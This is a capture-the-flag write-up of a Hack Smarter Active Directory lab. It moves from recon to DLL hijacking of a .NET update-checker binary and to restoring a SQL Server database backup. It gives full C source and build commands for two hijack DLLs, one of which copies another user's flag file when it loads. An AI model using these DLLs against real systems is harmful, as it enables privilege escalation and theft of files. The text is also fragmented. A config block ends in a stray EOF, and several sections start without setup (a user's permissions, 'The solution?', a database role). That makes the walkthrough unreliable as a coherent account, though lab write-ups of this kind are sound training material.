North Stone

A Hack Smarter Active Directory lab that took me from a SQL error page to domain compromise.

Objective

Hack Smarter's North Stone lab begins with VPN access and no credentials. The objective is complete domain compromise.

Initial access

Let's set our Target IP as a variable:

tip=<TARGET_IP>
echo $tip

The key findings: AD services, IIS on port 80, and SQL Server listeners on ports 1433 and 55203. Nmap also identified northstone.local as the domain and DC.northstone.local as the DC.

Finding a foothold

Our three best options to gain a foothold so far:

  • SMB - Authenticating as a guest if null auth and/or guest account aren't disabled.
  • DNS - We'll try a zone transfer. Even if it fails, DNS records may reveal names we can test as IIS virtual hosts.
  • MSSQL - Ports 1433 and 55203 are both SQL Server listeners. We'll see if they expose different instances or applications.

[realms]
    NORTHSTONE.LOCAL = {
        kdc = 10.1.156.144
    }

[domain_realm]
    .northstone.local = NORTHSTONE.LOCAL
    northstone.local = NORTHSTONE.LOCAL
EOF

We have a 64-bit .NET assembly on our hands. Let's take a look at lines of decompiled code surrounding the DLL reference:

DOTNET_ROOT="$HOME/.dotnet" PATH="$HOME/.dotnet:$PATH" ilspycmd WindowsUpdateChecker.exe | grep -n -C 12 -Ei 'wuaclt\.dll|modules|LoadLibrary'

The decompiled code tells us some important details:

  1. Main checks for the existence of C:\Program Files\WindowsUpdateChecker\modules\wuaclt.dll.
  2. If it does exist, LoadDLLSilent uses wuaclt.dll to call Windows LoadLibrary.
  3. The code then looks up an export named TestFunction, but from what I see, the code doesn't call TestFunction. The DLL's initialization code can still run when loaded by LoadLibrary.
  4. The program then takes a 60 second nap (sleep).

Paired with Tony's Modify permission, this is shaping up to almost be a confirmed DLL-loading find.

We'll make a PoC DLL that, when it loads, will write the present account's username to C:\ProgramData\NorthStoneDllProof.txt:

cat > proof.c <<'EOF'
#include <windows.h>

__declspec(dllexport) void TestFunction(void) {}

BOOL WINAPI DllMain(HINSTANCE dll, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        char user[256] = {0};
        DWORD user_size = sizeof(user);

        if (GetUserNameA(user, &user_size)) {
            HANDLE file = CreateFileA(
                "C:\\ProgramData\\NorthStoneDllProof.txt",
                FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
            );
            if (file != INVALID_HANDLE_VALUE) {
                DWORD written;
                WriteFile(file, user, lstrlenA(user), &written, NULL);
                WriteFile(file, "\r\n", 2, &written, NULL);
                CloseHandle(file);
            }
        }
    }
    return TRUE;
}
EOF

The solution?

Make the DLL read c.white’s user.txt and copy it to a location where Tony can see it. This script will have the DLL copy the file while running as c.white.

Run this on your local terminal:

cat > flag-copy.c <<'EOF'
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        CopyFileA(
            "C:\\Users\\c.white\\Desktop\\user.txt",
            "C:\\ProgramData\\NorthStoneUserFlag.txt",
            FALSE
        );
    }
    return TRUE;
}

__declspec(dllexport) void TestFunction(void) {}
EOF
x86_64-w64-mingw32-gcc -shared -o wuaclt-flag.dll flag-copy.c

The 1 under is_dbcreator gives us a leg to stand on while trying to recreate the database.

According to Microsoft's documented method, we can restore the backup as a separate database via WITH MOVE, which will direct the databases data and log files to new filenames. Makes sense to me.

Let's see where the NorthStoneDB files are stored:

SELECT name, physical_name FROM sys.master_files WHERE database_id = DB_ID('NorthStoneDB');

We found where the data and log files live.

Also under the guidance of Microsoft's documentation, we can now assign a name to the "new"/reconstructed database, and use VERIFYONLY to check the backup and our target file destination:

RESTORE VERIFYONLY FROM DISK = N'C:\BackupDB\NorthStoneDB.bak' WITH MOVE N'NorthStoneDB' TO N'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\NorthStoneDB_Recovered.mdf', MOVE N'NorthStoneDB_log' TO N'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\NorthStoneDB_Recovered_log.ldf';

Woo! “The backup set on file 1 is valid” means we passed the SQL test. We can officially restore the database under its new name, NorthStoneDB_Recovered:

RESTORE DATABASE NorthStoneDB_Recovered FROM DISK = N'C:\BackupDB\NorthStoneDB.bak' WITH MOVE N'NorthStoneDB' TO N'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\NorthStoneDB_Recovered.mdf', MOVE N'NorthStoneDB_log' TO N'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\NorthStoneDB_Recovered_log.ldf';

Never underestimate the power of reading the official source guidance. We successfully resuscitated the database. All 353 pages of it. Hot damn.
